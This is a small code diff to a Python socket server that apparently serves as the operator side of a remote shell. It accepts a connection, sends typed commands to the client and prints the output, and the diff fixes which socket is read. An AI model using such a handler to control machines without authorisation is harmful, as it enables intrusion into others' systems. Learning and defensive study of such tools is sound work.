@@ -11,11 +11,12 @@ s.listen(5)
 print("[+] server is running... ")
 
 c, adr = s.accept()
+print("connected to : %s \n" % str(adr))
 
 while True:
-
-    shell = input(s.recv(1024).decode('utf-8'))
-    c.send(shell.encode('utf-8'))
+     
+    shell = input(c.recv(1024).decode('utf-8'))
+    c.sendall(shell.encode('utf-8'))
     data = c.recv(102343)
     print(data)
 
